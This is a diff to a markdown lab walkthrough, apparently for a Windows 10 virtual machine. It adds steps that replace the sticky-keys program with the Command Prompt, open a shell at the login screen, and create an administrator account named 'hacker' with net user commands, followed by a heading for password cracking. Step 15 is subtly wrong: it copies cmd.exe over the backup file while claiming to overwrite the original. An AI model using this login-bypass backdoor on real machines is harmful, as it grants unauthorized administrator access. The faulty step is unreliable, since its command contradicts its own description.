@@ -84,4 +84,17 @@ get test.txt
 13. Type `cd /mnt/sda2/Windows/System32`
 14. Type `cp sethc.exe sethc.exe.bak` to make a copy of the `sethc.exe` file
 15. Type `cp cmd.exe sethc.exe.bak` to overwrite the original file with the Command Prompt executable
-16. Type `init 0`
+16. Type `init 0` to shutdown
+17. Set the CD/DVD back to "Use Physical Drive"
+18. Start up the Win10 VM
+19. At the login screen, press the shift key 5 times quickly
+20. In the Command Prompt, type:
+```
+net user hacker 1qwer$#@! /add
+net localgroup administrators hacker /add
+exit
+```
+
+21. Restart the Win10 VM to refresh and login to the newly added user
+
+### Windows Password Cracking
